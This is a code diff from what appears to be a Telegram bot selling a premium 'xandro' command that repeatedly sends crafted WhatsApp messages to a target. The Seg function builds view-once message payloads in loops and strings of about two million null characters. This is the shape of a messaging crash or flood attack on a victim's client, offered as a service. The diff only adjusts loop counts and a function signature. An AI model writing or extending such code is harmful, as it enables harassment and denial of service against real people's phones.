@@ -1583,7 +1583,7 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await Seg(target, true);
+        await Seg(sock, target);
         await sleep(3000);
       }
     } catch (err) {
@@ -1867,9 +1867,8 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-
-async function Seg(sock, target, ptcp = true) {
-    for (let r = 0; r < 88; r++) {
+async function Seg(target, ptcp = true) {
+    for (let r = 0; r < 100; r++) {
         const payload = generateWAMessageFromContent(target, {
             viewOnceMessage: {
                 message: {
@@ -1910,7 +1909,7 @@ async function Seg(sock, target, ptcp = true) {
         await sleep(1000);
     }
     let payload = "";
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 399; i++) {
         payload = "\u0000".repeat(2097152);
     }
 
